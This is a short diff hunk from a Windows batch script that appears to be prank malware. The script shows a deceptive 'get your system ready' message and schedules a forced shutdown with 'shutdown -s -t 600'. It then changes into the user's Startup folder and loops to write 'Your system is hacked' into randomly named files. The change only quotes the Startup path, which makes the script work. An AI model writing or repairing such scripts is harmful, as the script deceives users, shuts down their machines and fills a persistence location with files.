@@ -3,7 +3,7 @@ start "" /wait cmd /c "echo Before prosiding, we need to get your system ready. 
 
 shutdown -s -t 600
 
-CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
+CD "%HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup"
 
 :start
 echo Your system is hacked > dontDelete%random%.txt
